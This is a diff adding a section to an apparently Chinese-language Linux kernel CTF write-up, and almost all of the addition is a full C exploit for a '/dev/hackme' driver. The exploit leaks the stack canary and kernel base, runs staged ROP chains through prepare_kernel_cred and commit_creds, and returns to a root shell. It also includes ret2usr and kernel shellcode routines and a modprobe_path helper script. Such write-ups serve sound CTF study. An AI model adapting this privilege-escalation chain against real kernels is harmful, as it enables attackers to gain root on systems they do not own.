@@ -359,11 +359,359 @@ ffffffffac58d4fc r __ksymtab_prepare_kernel_cred
 
 ## 8.2 多次trampoline+ROP<br>
 区域有限，可用的gadget太少了，无法通过一次ROP完成利用。只能尝试分段rop的方法。<br>
+不过多解释，直接放出完整的exp:<br>
+```c
+// gcc -fcf-protection=none -masm=intel -static xxx.c -o xxx
+
+#define _GNU_SOURCE
+#include <sys/types.h>
+#include <stdio.h>
+#include <linux/userfaultfd.h>
+#include <pthread.h>
+#include <errno.h>
+#include <unistd.h> // read, write
+#include <stdlib.h>
+#include <fcntl.h> // define open, O_RDONLY, O_WRONLY, O_CREAT 
+#include <signal.h>
+#include <sys/wait.h> // waitpid
+#include <poll.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <sys/syscall.h>
+#include <sys/ioctl.h>  // ioctl
+#include <sys/sem.h>
+#include <semaphore.h>
+#include <poll.h>
+#include <sys/ipc.h>
+#include <sys/msg.h> // msg_msg 
+#include <sched.h> 
+#include <stdint.h>
 
 
+size_t commit_creds= 0xffffffff814c6410;
+size_t prepare_kernel_cred =0xffffffff814c67f0;
+
+size_t user_cs;
+size_t user_ss;
+size_t user_sp;
+size_t user_rflags;
+void save_status(void){
+    __asm__(
+        "mov user_cs,cs;"
+        "mov user_ss,ss;"
+        "mov user_sp,rsp;"
+        "pushf;"
+        "pop user_rflags;"
+    );
+    user_sp = user_sp -8;
+    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
+}
+
+void get_root_shell(void){
+    if(getuid())
+    {
+        printf("\033[31m\033[1m[x] Failed to get the root!\033[0m\n");
+        exit(-1);
+    }
+    printf("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n");
+    system("/bin/sh");
+}
+
+// ret2usr
+unsigned long user_rip = (unsigned long)get_root_shell;
+__attribute__((naked, noinline))  void escalate_privs(void){
+    __asm__(
+        "movabs rax, prepare_kernel_cred;" //prepare_kernel_cred
+        "xor rdi, rdi;"
+	    "call rax; mov rdi, rax;"
+	    "movabs rax, commit_creds;" //commit_creds
+	    "call rax;"
+        "swapgs;"
+        "mov r15, user_ss;"
+        "push r15;"
+        "mov r15, user_sp;"
+        "push r15;"
+        "mov r15, user_rflags;"
+        "push r15;"
+        "mov r15, user_cs;"
+        "push r15;"
+        "mov r15, user_rip;"
+        "push r15;"
+        "iretq;"
+    );
+}
+
+
+// kernel shellcode
+__attribute__((naked, noinline)) void privilege_escalation_kernel_shellcode(){
+    __asm__ (
+        "mov rbx, 0xffffffff810895e0;" //prepare_kernel_cred_addr
+        "mov rdi, 0;"
+        "call rbx;"     //prepare_kernel_cred(0)
+        "mov rdi, rax;" 
+        "mov rbx, 0xffffffff810892c0;" //commit_creds_addr
+        "call rbx;"
+        "nop;"
+        "ret;"
+    );
+}
+
+// modprobe
+void environ_set(void){
+    puts("[*] Returned to userland, setting up for fake modprobe");
+    
+    //system("mkdir /tmp");
+    system("echo '#!/bin/sh\ncp /flag /tmp/flag\nchmod 777 /tmp/flag' > /tmp/exp");
+    system("chmod +x /tmp/exp");
+
+    system("printf '\xff\xff\xff\xff'  > /tmp/dummy");
+    system("chmod 777 /tmp/dummy");
+    //exit(0);
+}
+void get_flag(void){
+    puts("[*] Run unknown file");
+    system("cat /proc/sys/kernel/modprobe");
+    system("/tmp/dummy");
+
+    puts("[*] Hopefully flag is readable");
+    system("cat /tmp/flag");
+    exit(0);
+}
+
+
+// msg_msg 
+// make sure the process run in one fixed cpu
+static void pin_to_current_cpu(void)
+{
+    cpu_set_t set;
+    int cpu = sched_getcpu();
+
+    if (cpu < 0) {
+        fprintf(stderr, "[-] sched_getcpu failed: %s\n", strerror(errno));
+        return;
+    }
+
+    CPU_ZERO(&set);
+    CPU_SET(cpu, &set);
+    if (sched_setaffinity(0, sizeof(set), &set) < 0)
+        fprintf(stderr, "[-] sched_setaffinity failed: %s\n", strerror(errno));
+    else
+        fprintf(stderr, "[+] pinned to CPU %d\n", cpu);
+}
+
+static void fatal(const char *what)
+{
+    perror(what);
+    exit(EXIT_FAILURE);
+}
+
+#define TARGET_OBJECT_SIZE  0x1d0UL          /* need to change according to the situation*/
+#define MSG_HEADER_SIZE    0x30UL
+#define MSGSEG_HEADER_SIZE 0x08UL
+#define DATAMSG_LEN        (0x1000UL - MSG_HEADER_SIZE)       /* 0xfd0 */
+#define DATAMSGSEG_LEN     (TARGET_OBJECT_SIZE - MSGSEG_HEADER_SIZE)
+#define MESSAGE_SIZE        (DATAMSG_LEN + DATAMSGSEG_LEN)       /* target msg size */
+
+struct message {
+    long type;
+    unsigned char text[MESSAGE_SIZE];
+};
+
+int msg_create_queue(){
+    // int key = ftok(".",0); // create a new key and can be found by other process
+    // int msg_id = msgget(key,0666| IPC_CREAT);
+    int msg_id = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
+    if (msg_id < 0)
+        fatal("msgget");
+    fprintf(stderr, "[+] created SysV message queue %d\n", msg_id);
+    return msg_id;
+}
+
+void msg_send(int msg_id, void *msg_addr,int msg_size, int flag){
+    int mark = msgsnd(msg_id,msg_addr,msg_size,flag);
+    if (mark <0){
+        fatal("msg send");
+    }
+}
+
+void msg_recv(int msg_id, void *msg_addr,int msg_size,int msg_type, int flag){
+    int received = msgrcv(msg_id, msg_addr, msg_size, msg_type, flag);
+    if (received < 0){
+        fatal("msgrcv");
+    }
+}
+
+
+int open_device(){
+    int fd = open("/dev/hackme",O_RDWR);
+    if (fd < 0){
+		puts("[!] Failed to open device");
+		exit(-1);
+	} else {
+        puts("[*] Opened device");
+    }
+    return fd;
+}
+
+unsigned long ksymtab_prepare_kernel_cred = 0;
+unsigned long ksymtab_commit_cred = 0;
+unsigned long root_cred=0;
+int fd=0;
+unsigned long canary = 0;
+unsigned long kernel_base = 0;
+unsigned long pop_rdi_ret = 0;
+unsigned long swapgs_restore_regs_and_return_to_usermode = 0;
+unsigned long mov_eax_mem_pop_rbp_ret = 0;
+unsigned long pop_rax_ret = 0;
+
+void stage4_call_commit_creds(){
+    unsigned long tmp_buf[50];
+    unsigned long size = 0x8*50;
+    int off = 16;
+    tmp_buf[off++] = canary;
+    tmp_buf[off++] = 0; //padding
+    tmp_buf[off++] = 0; //padding
+    tmp_buf[off++] = 0; //padding
+    tmp_buf[off++] = pop_rdi_ret;
+    tmp_buf[off++] = root_cred;
+    tmp_buf[off++] = commit_creds;
+    tmp_buf[off++] = swapgs_restore_regs_and_return_to_usermode;
+    tmp_buf[off++] = 0; //padding
+    tmp_buf[off++] = 0; //padding
+    tmp_buf[off++] = (unsigned long)get_root_shell;
+    tmp_buf[off++] = user_cs;
+    tmp_buf[off++] = user_rflags;
+    tmp_buf[off++] = user_sp;
+    tmp_buf[off++] = user_ss;    
+    write(fd,tmp_buf,size);
+    puts("[!] Should never be reached");
+}
+
+__attribute__((naked, noinline)) void stage3_get_root_cred(){
+    __asm__(
+        "mov root_cred, rax;"
+    );
+    printf("root_cred: %p\n",root_cred);
+    stage4_call_commit_creds();
+}
+
+
+void stage3_call_prepare_kernel_cred(){
+    unsigned long tmp_buf[50];
+    unsigned long size = 0x8*50;
+    int off = 16;
+    tmp_buf[off++] = canary;
+    tmp_buf[off++] = 0; //padding
+    tmp_buf[off++] = 0; //padding
+    tmp_buf[off++] = 0; //padding
+    tmp_buf[off++] = pop_rdi_ret;
+    tmp_buf[off++] = 0;
+    tmp_buf[off++] = prepare_kernel_cred;
+    tmp_buf[off++] = swapgs_restore_regs_and_return_to_usermode;
+    tmp_buf[off++] = 0; //padding
+    tmp_buf[off++] = 0; //padding
+    tmp_buf[off++] = (unsigned long)stage3_get_root_cred;
+    tmp_buf[off++] = user_cs;
+    tmp_buf[off++] = user_rflags;
+    tmp_buf[off++] = user_sp;
+    tmp_buf[off++] = user_ss;    
+    write(fd,tmp_buf,size);
+    puts("[!] Should never be reached");
+}
+
+__attribute__((naked, noinline)) void stage2_get_commit_cred_addr(){
+    __asm__(
+        "mov commit_creds, rax;"
+    );
+    commit_creds = ksymtab_commit_cred + (int)commit_creds;
+    printf("commit_creds addr: %p\n",commit_creds);
+    stage3_call_prepare_kernel_cred();
+}
+
+void stage2_leak_commit_cred_addr(){
+    unsigned long tmp_buf[50];
+    unsigned long size = 0x8*50;
+    int off = 16;
+    tmp_buf[off++] = canary;
+    tmp_buf[off++] = 0; //padding
+    tmp_buf[off++] = 0; //padding
+    tmp_buf[off++] = 0; //padding
+    tmp_buf[off++] = pop_rax_ret;
+    tmp_buf[off++] = ksymtab_commit_cred;
+    tmp_buf[off++] = mov_eax_mem_pop_rbp_ret;
+    tmp_buf[off++] = 0; //padding
+    tmp_buf[off++] = swapgs_restore_regs_and_return_to_usermode;
+    tmp_buf[off++] = 0; //padding
+    tmp_buf[off++] = 0; //padding
+    tmp_buf[off++] = (unsigned long)stage2_get_commit_cred_addr;
+    tmp_buf[off++] = user_cs;
+    tmp_buf[off++] = user_rflags;
+    tmp_buf[off++] = user_sp;
+    tmp_buf[off++] = user_ss;    
+    write(fd,tmp_buf,size);
+    puts("[!] Should never be reached");
+}
+
+__attribute__((naked, noinline)) void stage1_get_kernel_cred_addr(){
+    __asm__(
+        "mov prepare_kernel_cred, rax;"
+    );
+    prepare_kernel_cred = ksymtab_prepare_kernel_cred + (int)prepare_kernel_cred;
+    printf("prepare_kernel_cred_addr: %p\n",prepare_kernel_cred);
+    stage2_leak_commit_cred_addr(); // call next function
+}
+
+void stage1_leak_prepare_kernel_cred_addr(){
+    unsigned long tmp_buf[50];
+    unsigned long size=0x8*50;
+    int off = 16;
+    tmp_buf[off++] = canary;
+    tmp_buf[off++] = 0; //padding
+    tmp_buf[off++] = 0; //padding
+    tmp_buf[off++] = 0; //padding
+    tmp_buf[off++] = pop_rax_ret; 
+    tmp_buf[off++] = ksymtab_prepare_kernel_cred;
+    tmp_buf[off++] = mov_eax_mem_pop_rbp_ret;
+    tmp_buf[off++] = 0;//padding
+    tmp_buf[off++] = swapgs_restore_regs_and_return_to_usermode;
+    tmp_buf[off++] = 0;  // padding
+    tmp_buf[off++] = 0;  //padding
+    tmp_buf[off++] = (unsigned long )stage1_get_kernel_cred_addr;
+    tmp_buf[off++] = user_cs;
+    tmp_buf[off++] = user_rflags;
+    tmp_buf[off++] = user_sp;
+    tmp_buf[off++] = user_ss;
+    write(fd,tmp_buf,size);   
+    puts("[!] Should never be reached");
+}
+int main(){
+    // step 0 : save status
+    save_status();
+
+    fd =open_device();
+    // step 1: leak the canary and linux_base
+    unsigned long tmp_buf[50];
+    unsigned long size=0x8*50;
+    read(fd,tmp_buf,size);
+    canary = tmp_buf[16];
+    kernel_base = tmp_buf[38]-0xa157;
+    printf("canary: 0x%llx\n",canary);
+    printf("kernel_base: 0x%llx\n",kernel_base);
+
+    pop_rdi_ret = kernel_base + 0x6370;
+    swapgs_restore_regs_and_return_to_usermode = kernel_base +0x200f10+22; 
+    ksymtab_prepare_kernel_cred = kernel_base+ 0xf8d4fc; 
+    ksymtab_commit_cred = kernel_base + 0xf87d90;
+    mov_eax_mem_pop_rbp_ret = kernel_base + 0x15a80;
+    pop_rax_ret = kernel_base +0x4d11;
+    // step 2: construct the payload
+    stage1_leak_prepare_kernel_cred_addr();   
+}
+```
 
 # references<br>
 [https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/](https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/)<br>
+[https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/](https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/)<br>
 [https://trungnguyen1909.github.io/blog/post/matesctf/KSMASH/](https://trungnguyen1909.github.io/blog/post/matesctf/KSMASH/)<br>
 
 <!-- Google tag (gtag.js) -->
